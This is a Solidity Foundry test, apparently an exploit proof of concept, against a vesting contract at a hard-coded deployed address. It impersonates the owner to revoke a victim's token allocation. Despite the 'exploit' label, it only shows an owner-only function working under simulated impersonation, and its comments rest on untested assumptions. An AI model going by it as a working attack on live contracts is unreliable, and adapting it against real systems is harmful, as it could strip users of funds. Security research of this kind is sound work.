pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface Advisory {
    function token() external view returns (IBEP20);
    function owner() external view returns (address);
    function user(address) external view returns (uint balance, uint totalClaimed, uint initiated, uint lastClaim);
    function addDistributionWallet(address[] memory account, uint[] memory amount, uint[] memory startTime) external;
    function revokeDistributionWallet(address[] memory account) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xaba9Ecc06b23d688CB353FC57919D416eedFA095;
    address attacker = address(this);
    address victim = address(0x123);
    Advisory target;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the contract instance
        target = Advisory(TARGET);

        // Get the token address
        address tokenAddress = address(target.token());

        // Create a victim address
        victim = address(0x123);
        vm.label(victim, "Victim");

        // Impersonate the owner
        address owner = target.owner();
        vm.startPrank(owner);

        // Ensure the contract has enough tokens
        // First, give tokens to the contract from somewhere
        // We'll need to mint tokens to the contract address
        // Since we can't mint arbitrary tokens, we'll use deal() if it's a standard token
        // But we need to know if the token supports deal() - assuming it does for PoC
        deal(tokenAddress, address(target), 1000 ether);

        // Add victim as distribution wallet
        address[] memory accounts = new address[](1);
        accounts[0] = victim;
        uint[] memory amounts = new uint[](1);
        amounts[0] = 100 ether;
        uint[] memory startTimes = new uint[](1);
        startTimes[0] = block.timestamp + 1 days; // Future start time

        target.addDistributionWallet(accounts, amounts, startTimes);

        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Now exploit: call revokeDistributionWallet as owner
        vm.startPrank(target.owner());

        address[] memory victims = new address[](1);
        victims[0] = victim;

        target.revokeDistributionWallet(victims);

        vm.stopPrank();

        // Verify the exploit worked
        (uint balance, , , ) = target.user(victim);
        assertEq(balance, 0, "Victim balance should be 0 after revocation");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

